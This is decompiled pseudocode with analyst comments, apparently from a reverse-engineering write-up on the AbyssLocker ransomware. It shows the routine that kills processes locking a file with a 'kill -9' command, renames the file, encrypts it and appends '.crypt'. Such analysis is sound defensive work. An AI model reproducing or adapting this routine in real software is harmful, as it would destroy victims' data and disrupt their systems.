////////////////////////////////////////////////////////////
// AbyssLocker
// https://www.shadowstackre.com/analysis/AbyssLocker
//
// Technique: Mitre Data encrypted for impact
// URL: https://attack.mitre.org/techniques/T1486/
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

char *__fastcall ProcessFiles(_QWORD *argTargetFile)
{
  char *v2; // rdi
  char *ptrTargetFile; // rbp
  __int64 i; // rcx
  size_t v5; // r13
  char *targetFileNameCrypt; // rbp
  char *v7; // rax
  char *targetFileNameTmp; // r12
  char *v9; // rdi
  int SharedLock; // r13d
  char *v11; // rdi
  __int64 j; // rcx
  const char *v13; // r13
  __int64 v14; // rcx
  int v15; // esi
  int v16; // edi
  struct timespec abstime; // [rsp+8h] [rbp-10D0h] BYREF
  char command[128]; // [rsp+18h] [rbp-10C0h] BYREF
  char targetFile[4096]; // [rsp+98h] [rbp-1040h] BYREF
  unsigned __int64 v21; // [rsp+1098h] [rbp-40h]

  v21 = __readfsqword(0x28u);

  // Log an error if file name is empty
  if ( !argTargetFile )
  {
    if ( pthread_cond_signal(&cond) )
    {
      if ( logFD )
      {
        abstime.tv_nsec = 0LL;
        abstime.tv_sec = 1LL;
        sem_timedwait(&sem, &abstime);
        __fprintf_chk(logFD, 1LL, "main:%d\n", 369LL);
        fflush(logFD);
        sem_post(&sem);
      }
    }
    sub_322A(0, 1);
    dword_0 = 0;
    BUG();
  }
  v2 = targetFile;
  
  // Get the target file name to process
  ptrTargetFile = (char *)argTargetFile[1];
  for ( i = 1024LL; i; --i )
  {
    *(_DWORD *)v2 = 0;
    v2 += 4;
  }
  strncpy(targetFile, ptrTargetFile, 0x1000uLL);
  free(ptrTargetFile);
  v5 = (int)(strlen(targetFile) + 32);
  targetFileNameCrypt = (char *)malloc(v5);
  v7 = (char *)malloc(v5);
  targetFileNameTmp = v7;
  if ( !targetFileNameCrypt )
  {
    if ( pthread_cond_signal(&cond) && logFD )
    {
      abstime.tv_nsec = 0LL;
      abstime.tv_sec = 1LL;
      sem_timedwait(&sem, &abstime);
      __fprintf_chk(logFD, 1LL, "main:%d\n", 388LL);
      fflush(logFD);
      sem_post(&sem);
    }
    sub_322A(0, 1);
    *(_DWORD *)argTargetFile = 3;
    return 0LL;
  }
  if ( !v7 )
  {
    if ( pthread_cond_signal(&cond) && logFD )
    {
      abstime.tv_nsec = 0LL;
      abstime.tv_sec = 1LL;
      sem_timedwait(&sem, &abstime);
      __fprintf_chk(logFD, 1LL, "main:%d\n", 395LL);
      fflush(logFD);
      sem_post(&sem);
    }
    sub_322A(0, 1);
    *(_DWORD *)argTargetFile = 3;
    v9 = targetFileNameCrypt;
    goto LABEL_44;
  }
  sub_4BE1((__int64)targetFileNameCrypt, v5);
  __sprintf_chk(targetFileNameCrypt, 1LL, -1LL, "%s%s", targetFile, ".crypt");// name of the encrypted file
  __sprintf_chk(targetFileNameTmp, 1LL, -1LL, "%s%s", targetFile, ".tmp_");// name of the temporary file prior to encrypting


  // Get PID of process that has a FD to the file
  SharedLock = GetSharedLock(targetFile);
  if ( SharedLock )
  {
    if ( logFD )
    {
      abstime.tv_nsec = 0LL;
      abstime.tv_sec = 1LL;
      sem_timedwait(&sem, &abstime);
      __fprintf_chk(logFD, 1LL, "File Locked:%s PID:%d\n", targetFile, (unsigned int)SharedLock);
      fflush(logFD);
      sem_post(&sem);
    }
    v11 = command;
    for ( j = 32LL; j; --j )
    {
      *(_DWORD *)v11 = 0;
      v11 += 4;
    }
    if ( SharedLock > 10 )
    {
      // Stop the process using SIGKILL (no catch)
      __snprintf_chk(command, 128LL, 1LL, 128LL, "kill -9 %d", (unsigned int)SharedLock);
      v13 = (const char *)ExecuteCommand(command);
      if ( v13 && logFD )
      {
        abstime.tv_nsec = 0LL;
        abstime.tv_sec = 1LL;
        sem_timedwait(&sem, &abstime);
        __fprintf_chk(logFD, 1LL, "exec_pipe:%s \n", v13);
        fflush(logFD);
        sem_post(&sem);
      }
      usleep(0x3E8u);
    }
    // Determine if the file has a shared lock from another process
    if ( (unsigned int)GetSharedLock(targetFile) )
    {
      if ( logFD )
      {
        abstime.tv_nsec = 0LL;
        abstime.tv_sec = 1LL;
        sem_timedwait(&sem, &abstime);
        __fprintf_chk(logFD, 1LL, "error Lock file:%s\n", targetFile);
        fflush(logFD);
        sem_post(&sem);
      }
      if ( !pthread_cond_signal(&cond) || !logFD )
        goto LABEL_43;
      abstime.tv_nsec = 0LL;
      abstime.tv_sec = 1LL;
      sem_timedwait(&sem, &abstime);
      v14 = 428LL;
LABEL_42:
      __fprintf_chk(logFD, 1LL, "main:%d\n", v14);
      fflush(logFD);
      sem_post(&sem);
LABEL_43:
      sub_322A(0, 1);
      *(_DWORD *)argTargetFile = 3;
      free(targetFileNameCrypt);
      v9 = targetFileNameTmp;
LABEL_44:
      free(v9);
      return 0LL;
    }
  }
  // Rename the file for processing using the .tmp_ extension (pre-encrypted)
  if ( rename(targetFile, targetFileNameTmp) )
  {
    if ( logFD )
    {
      abstime.tv_nsec = 0LL;
      abstime.tv_sec = 1LL;
      sem_timedwait(&sem, &abstime);
      __fprintf_chk(logFD, 1LL, "Unable to rename file from: %s to: %s\n", targetFile, targetFileNameTmp);
      fflush(logFD);
      sem_post(&sem);
    }
    if ( !pthread_cond_signal(&cond) || !logFD )
      goto LABEL_43;
    abstime.tv_nsec = 0LL;
    abstime.tv_sec = 1LL;
    sem_timedwait(&sem, &abstime);
    v14 = 440LL;
    goto LABEL_42;
  }
  // Process the file for encryption
  if ( (unsigned int)EncryptFile(targetFileNameTmp, targetFile, dword_216014) == -1 )
  {
    if ( logFD )
    {
      abstime.tv_nsec = 0LL;
      abstime.tv_sec = 1LL;
      sem_timedwait(&sem, &abstime);
      __fprintf_chk(logFD, 1LL, "error encrypt: %s rename back:%s\n", targetFileNameTmp, targetFile);
      fflush(logFD);
      sem_post(&sem);
    }
    rename(targetFileNameTmp, targetFile);      // Rename the file back to the original
    v15 = 1;
    v16 = 0;
  }
  else
  {
    // Rename the file using the .crypt extension
    if ( rename(targetFileNameTmp, targetFileNameCrypt) && logFD )
    {
      abstime.tv_nsec = 0LL;
      abstime.tv_sec = 1LL;
      sem_timedwait(&sem, &abstime);
      __fprintf_chk(logFD, 1LL, "main:%d\n", 454LL);
      fflush(logFD);
      sem_post(&sem);
    }
    v15 = 0;
    v16 = 1;
  }
  sub_322A(v16, v15);
  if ( pthread_cond_signal(&cond) && logFD )
  {
    abstime.tv_nsec = 0LL;
    abstime.tv_sec = 1LL;
    sem_timedwait(&sem, &abstime);
    fputs("pthread_cond_signal() error", logFD);
    fflush(logFD);
    sem_post(&sem);
  }
  *(_DWORD *)argTargetFile = 2;
  free(targetFileNameTmp);
  return targetFileNameCrypt;
}



